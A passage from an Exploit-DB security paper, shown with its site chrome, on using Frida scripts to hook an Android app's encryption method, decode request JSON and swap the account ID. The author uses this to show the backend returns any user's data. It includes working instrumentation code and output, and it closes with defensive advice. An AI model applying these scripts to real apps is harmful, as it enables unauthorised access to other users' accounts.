        arg[1]: [123,34,116,121,112,101,34,58,34,48,48,48,49,48,48,50,34,44,34,99,105,100,34,58,34,49,49,48,48,48,48,50,57,51,56,52,49,34,125]
        retval: s9uOAVXQvyD7bxgZfPWGEaM+ki099foftC/6VRsDj/aiFW+vdFZFsQvqxHWBLLnmWC5FDCPs/Gigg3N7TxIQRJOX9jhC0cWIg2gKxw1tp5T+Kqli8eL97qIwndlA6JeK
        *** exiting com.example.vulnapp.E2e.encrypt
        --------------------------------------------------
		
        As the result, the object turned into array of numbers which arg[0] contained both positive and negative numbers but arg[1] contained only positive numbers. One thing we noticed was the array of arg[1] always start with 123 and end with 125 which is the ASCII code of &quot;{&quot; and &quot;}&quot; respectively so it could be JSON string? Then we focused only the arg[1] and modified the script a little more to convert those array of numbers into string.

        ----------raptor_frida_android_trace.js----------
        ...
        // print args
        if (arguments.length) console.log()
            for (var j = 0; j &lt; arguments.length; j++) {
                try {
                    if (j === 1) {
                        var argObj = JSON.parse(JSON.stringify(arguments[j]))
                        var str = &#039;&#039;
                            for (var i = 0; i &lt; argObj.length; i++) {
                                str += String.fromCharCode(argObj[i]) || argObj[i].toString()
                            }
                            console.log(&#039;arg[&#039; + j + &#039;]: &#039; + str)
                        } else {
                            console.log(&#039;arg[&#039; + j + &#039;]: &#039; + arguments[j])
                            }
                    } catch (e) {
                        console.log(&#039;arg[&#039; + j + &#039;]: &#039; + arguments[j])
                        }
            }
        ...
        --------------------------------------------------

        The code may looks a little bit awkward but its worked :p, and by running the script, we got the following output.

        --------------------------------------------------    
        *** entered com.example.vulnapp.E2e.encrypt
        arg[0]: [object Object]
        arg[1]: arg[1]: {&quot;type&quot;:&quot;0001002&quot;,&quot;cid&quot;:&quot;110000293841&quot;}
        retval: 6a2ZSUTMH9Wo4sXno4dQPHSKnXEKerhBa2TjM0eADEU02BmbcpIS+YqJvKYFyLtzo+lSJzZ7gW36affjTmTf5H49sMeYxLa1bs3oM813+9svGcP97Wrn8jwZq4Sdd/EZ
        *** exiting com.example.vulnapp.E2e.encrypt
        --------------------------------------------------

        We finally found the plaintext JSON. But why they were in the form of that ASCII array, we verified it with decompiled code and found that the method has the following signature and return type:

        --------------------E2e.class---------------------    
        ...
        private String encrypt(byte[] aesKey, byte[] plainReq) ...
        ...    
        --------------------------------------------------

        The method had the second argument called &quot;plainReq&quot; with type of byte array. That was the reason why they were in the object form (as seen by JS). The final step was to write the frida script that manipulate a parameter value for us.
    
        -------------frida_manipulate_e2e.js---------------
        Java.perform(function () {
            var E2eClass = Java.use(&#039;com.example.vulnapp.E2e&#039;)
            E2eClass.encrypt.implementation = function () {
                var curAcc = &#039;110000293841&#039;
                var newAcc = &#039;210000293903&#039;
                var a = JSON.parse(JSON.stringify(arguments[1]))
                var s = &#039;&#039;
                    for (var i = 0; i &lt; a.length; i++) {
                        s += String.fromCharCode(a[i])
                        }
                    var r = s.replace(curAcc, newAcc).split(&#039;&#039;)
                    var p = []
                    r.forEach(function (c) {
                        p.push(c.charCodeAt(0))
                        })
            console.log(&#039;\n\nOriginal Request: &#039; + s)
            console.log(&#039;New Request: &#039; + s.replace(curAcc, newAcc))
            return this.encrypt(arguments[0], p)
            }
        })
        --------------------------------------------------

        By replacing the argument values passing to the method we could manipulate value of parameter before sending to the backend API and found that the server did not properly verify the account number which led us to retrieve information on any users by just changing the &quot;cid&quot; parameter as output below.
    
        --------------------------------------------------
        frida -U com.example.vulnapp -l frida_manipulate_e2e.js --no-pause
             ____
            / _  |   Frida 10.6.32 - A world-class dynamic instrumentation framework
           | (_| |
            &gt; _  |   Commands:
           /_/ |_|       help      -&gt; Displays the help system
           . . . .       object?   -&gt; Display information about &#039;object&#039;
           . . . .       exit/quit -&gt; Exit
           . . . .
           . . . .   More info at http://www.frida.re/docs/home/

        [Android Emulator 5554::com.example.vulnapp]-&gt;
        Original Request: {&quot;type&quot;:&quot;0001002&quot;,&quot;cid&quot;:&quot;110000293841&quot;}
        New Request: {&quot;type&quot;:&quot;0001002&quot;,&quot;cid&quot;:&quot;210000293903&quot;}
        --------------------------------------------------
		
        From the result, were able to test the rest of the communication between device and the backend API using mentioned technique. Also, we could use this technique to identify another vulnerabilities on another functions. This means the developer did not aware of such technique and overlooked the fundamental controls that can actually secure the app.
		
        Even though a mobile applications now have more requirements on defense in depth mechanism such as SSL pinning, end-to-end encryption, insecure environement detection etc. the most important thing to make app (reasonably) secure is to make sure that all of the fundamental controls (e.g. Input validation, Authentication and authorisation on Backend API) are in place to prevent flaws at the root cause.
		
        &quot;Don&#039;t underestimate the power of the Dark Side!&quot; - Darth Vader
		
		
######################
 [0x03] - Special Thx
######################

L@mp4rd, RailDex, 2600 Thailand, Exploit-db.com
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/44139" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/44193" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
                                 alt="Offensive Security">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
                        that provides various <a
                                href="https://www.offensive-security.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offensive-security.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by Offensive Security.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">Offensive Security Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <tr>
                                <th class="text-center"><strong>Downloads</strong></th>
                                <th class="text-center"><strong>Certifications</strong></th>
                                <th class="text-center"><strong>Training</strong></th>
                                <th class="text-center"><strong>Services</strong></th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">OSCP
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                                       target="_blank" rel="noopener">
                                        Kali NetHunter
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">OSWP
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                                       target="_blank" rel="noopener">Advanced Attack Simulation
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                                       target="_blank" rel="noopener">Kali Linux Revealed Book
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">OSEP
                                    </a>
                                </td>
                                <td>
                                    <a href="/evasion-techniques-breaching-defenses"
                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
                                       target="_blank" rel="noopener">Application Security Assessment
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">OSWE
                                    </a>
                                </td>
                                <td>
                                    <a href="/advanced-web-attacks"
                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                                       <br />Updated for 2020
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">OSED
                                    </a>
                                </td>
                                <td>
                                    <a href="/windows-user-mode-exploit-development"
                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                                       <br />All new for 2021
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://www.offensive-security.com/awe-osee/"
                                       target="_blank" rel="noopener">OSEE
                                    </a>
                                </td>
                                <td>
<!--
                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                                    </a>
-->
                                </td>
                                <td></td>
                            </tr>

                            <tr class="text-center">
                                <td></td>
                                <td>
                                    <a href="https://kali.training/"
                                       target="_blank" rel="noopener">KLCP
                                    </a>
                                </td>
                                <td>
                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                                    </a>
                                </td>
                                <td></td>
                            </tr>

                            </tbody>

                        </table>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>

    <!-- Advanced Search Modal -->
<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="searchModalTitle">Search The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">

                    <div class="row">

                        <div class="col-sm-12 col-lg-8">

                            <div class="form-group">

                                <label for="titleSearch" class="control-label text-primary">Title</label>

                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
                                       placeholder="Title" value="" autofocus>

                            </div>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="cveSearch" class="control-label text-primary">CVE</label>

                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
                                       placeholder="2021-1234"
                                       value="" autofocus>

                            </div>

                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-6 col-lg-4">

                            <label for="typeSearchSelect" class="text-primary">Type</label>

                            <select id="typeSearchSelect" name="type" class="form-control">

                                <option></option>
                                
                                    <option value="dos" >
                                        dos
                                    </option>


                                
                                    <option value="local" >
                                        local
                                    </option>


                                
                                    <option value="remote" >
                                        remote
                                    </option>


                                
                                    <option value="shellcode" >
                                        shellcode
                                    </option>


                                
                                    <option value="papers" >
                                        papers
                                    </option>


                                
                                    <option value="webapps" >
                                        webapps
                                    </option>


                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <label for="platformSearchSelect" class="text-primary">Platform</label>

                            <select id="platformSearchSelect" name="platform" class="form-control">

                                <option></option>
                                
                                    <option value="aix" >
                                        AIX
                                    </option>

                                
                                    <option value="asp" >
                                        ASP
                                    </option>

                                
                                    <option value="bsd" >
                                        BSD
                                    </option>

                                
                                    <option value="bsd_ppc" >
                                        BSD_PPC
                                    </option>

                                
                                    <option value="bsd_x86" >
                                        BSD_x86
                                    </option>

                                
                                    <option value="bsdi_x86" >
                                        BSDi_x86
                                    </option>

                                
                                    <option value="cgi" >
                                        CGI
                                    </option>

                                
                                    <option value="freebsd" >
                                        FreeBSD
                                    </option>

                                
                                    <option value="freebsd_x86" >
                                        FreeBSD_x86
                                    </option>

                                
                                    <option value="freebsd_x86-64" >
                                        FreeBSD_x86-64
                                    </option>

                                
                                    <option value="generator" >
                                        Generator
                                    </option>

                                
                                    <option value="hardware" >
                                        Hardware
                                    </option>

                                
                                    <option value="hp-ux" >
                                        HP-UX
                                    </option>

                                
                                    <option value="irix" >
                                        IRIX
                                    </option>

                                
                                    <option value="jsp" >
                                        JSP
                                    </option>

                                
                                    <option value="linux" >
                                        Linux
                                    </option>

                                
                                    <option value="linux_mips" >
                                        Linux_MIPS
                                    </option>

                                
                                    <option value="linux_ppc" >
                                        Linux_PPC
                                    </option>

                                
                                    <option value="linux_sparc" >
                                        Linux_SPARC
                                    </option>

                                
                                    <option value="linux_x86" >
                                        Linux_x86
                                    </option>

                                
                                    <option value="linux_x86-64" >
                                        Linux_x86-64
                                    </option>

                                
                                    <option value="minix" >
                                        MINIX
                                    </option>

                                
                                    <option value="multiple" >
                                        Multiple
                                    </option>

                                
                                    <option value="netbsd_x86" >
                                        NetBSD_x86
                                    </option>

                                
                                    <option value="novell" >
                                        Novell
                                    </option>

                                
                                    <option value="openbsd" >
                                        OpenBSD
                                    </option>

                                
                                    <option value="openbsd_x86" >
                                        OpenBSD_x86
                                    </option>

                                
                                    <option value="osx_ppc" >
                                        OSX_PPC
                                    </option>

                                
                                    <option value="osx" >
                                        OSX
                                    </option>

                                
                                    <option value="php" >
                                        PHP
                                    </option>

                                
                                    <option value="plan9" >
                                        Plan9
                                    </option>

                                
                                    <option value="qnx" >
                                        QNX
                                    </option>

                                
                                    <option value="sco" >
                                        SCO
                                    </option>

                                
                                    <option value="sco_x86" >
                                        SCO_x86
                                    </option>

                                
                                    <option value="solaris" >
                                        Solaris
                                    </option>

                                
                                    <option value="solaris_sparc" >
                                        Solaris_SPARC
                                    </option>

                                
                                    <option value="solaris_x86" >
                                        Solaris_x86
                                    </option>

                                
                                    <option value="tru64" >
                                        Tru64
                                    </option>

                                
                                    <option value="ultrix" >
                                        ULTRIX
                                    </option>

                                
                                    <option value="unix" >
                                        Unix
                                    </option>

                                
                                    <option value="unixware" >
                                        UnixWare
                                    </option>

                                
                                    <option value="windows_x86" >
                                        Windows_x86
                                    </option>

                                
                                    <option value="windows_x86-64" >
                                        Windows_x86-64
                                    </option>

                                
                                    <option value="windows" >
                                        Windows
                                    </option>

                                
                                    <option value="arm" >
                                        ARM
                                    </option>

                                
                                    <option value="cfm" >
                                        CFM
                                    </option>

                                
                                    <option value="netware" >
                                        Netware
                                    </option>

                                
                                    <option value="superh_sh4" >
                                        SuperH_SH4
                                    </option>

                                
                                    <option value="java" >
                                        Java
                                    </option>

                                
                                    <option value="beos" >
                                        BeOS
                                    </option>

                                
                                    <option value="immunix" >
                                        Immunix
                                    </option>

                                
                                    <option value="palm_os" >
                                        Palm_OS
                                    </option>

                                
                                    <option value="atheos" >
                                        AtheOS
                                    </option>

                                
                                    <option value="ios" >
                                        iOS
                                    </option>

                                
                                    <option value="android" >
                                        Android
                                    </option>

                                
                                    <option value="xml" >
                                        XML
                                    </option>

                                
                                    <option value="perl" >
                                        Perl
                                    </option>

                                
                                    <option value="python" >
                                        Python
                                    </option>

                                
                                    <option value="system_z" >
                                        System_z
                                    </option>

                                
                                    <option value="json" >
                                        JSON
                                    </option>

                                
                                    <option value="ashx" >
                                        ASHX
                                    </option>

                                
                                    <option value="ruby" >
                                        Ruby
                                    </option>

                                
                                    <option value="aspx" >
                                        ASPX
                                    </option>

                                
                                    <option value="macos" >
                                        macOS
                                    </option>

                                
                                    <option value="linux_crisv32" >
                                        Linux_CRISv32
                                    </option>

                                
                                    <option value="ezine" >
                                        eZine
                                    </option>

                                
                                    <option value="magazine" >
                                        Magazine
                                    </option>

                                
                                    <option value="nodejs" >
                                        NodeJS
                                    </option>

                                
                                    <option value="alpha" >
                                        Alpha
                                    </option>

                                
                                    <option value="solaris_mips" >
                                        Solaris_MIPS
                                    </option>

                                
                                    <option value="lua" >
                                        Lua
                                    </option>

                                
                                    <option value="watchos" >
                                        watchOS
                                    </option>

                                
                                    <option value="vxworks" >
                                        VxWorks
                                    </option>

                                
                                    <option value="python2" >
                                        Python2
                                    </option>

                                
                                    <option value="python3" >
                                        Python3
                                    </option>

                                
                            </select>

                        </div>

                        <div class="col-sm-6 col-lg-4">

                            <div class="form-group">

                                <label for="authorSearch" class="text-primary">Author</label>

                                <input id="authorSearch" class="form-control" type="text" name="e_author"
                                       placeholder="Author" value="">

                            </div>
                        </div>

                    </div>

                    <div class="row">

                        <div class="col-sm-12 col-lg-6">

                            <div class="form-group">

                                <label for="textSearch" class="control-label text-primary">Content</label>

                                <input id="textSearch" class="form-control" type="text" name="text"
